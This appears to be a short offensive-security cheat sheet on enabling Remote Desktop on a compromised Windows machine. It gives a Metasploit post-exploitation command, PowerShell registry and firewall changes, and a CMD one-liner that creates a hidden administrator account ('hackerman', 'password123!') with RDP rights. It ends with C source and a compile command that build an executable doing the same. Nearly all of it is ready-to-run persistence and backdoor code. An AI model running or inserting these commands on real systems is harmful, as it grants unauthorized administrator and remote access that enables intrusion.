Sometimes we want to enable RDP for a new user when it is not already configured. 

NOTE: On older versions of windows this may now work as cleanly...

Metasploit
```Metasploit
run post/windows/manage/enable_rdp
```

PowerShell
```powershell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0
New-NetFirewallRule -DisplayName "Remote Desktop" -Direction Inbound -Protocol TCP -LocalPort 3389 -Action Allow
```

CMD One-Liner
```cmd
net user /add hackerman password123! && net localgroup administrators hackerman /add & net localgroup "Remote Desktop Users" hackerman /add & netsh advfirewall firewall set rule group="remote desktop" new enable=Yes & reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f & sc config TermService start= auto
```

C Code
```c
# SEE CODE BELOW (x64)
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user hackerman password123! /add");
  i = system ("net localgroup administrators hackerman /add");
  i = system ("net localgroup \"Remote Desktop Users\" hackerman /add");
  i = system ("netsh advfirewall firewall set rule group=\"Remote Desktop\" new enable=yes");
  i = system ("reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f");
  i = system ("sc config TermService start= auto");
  
  return 0;
}

# compile
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

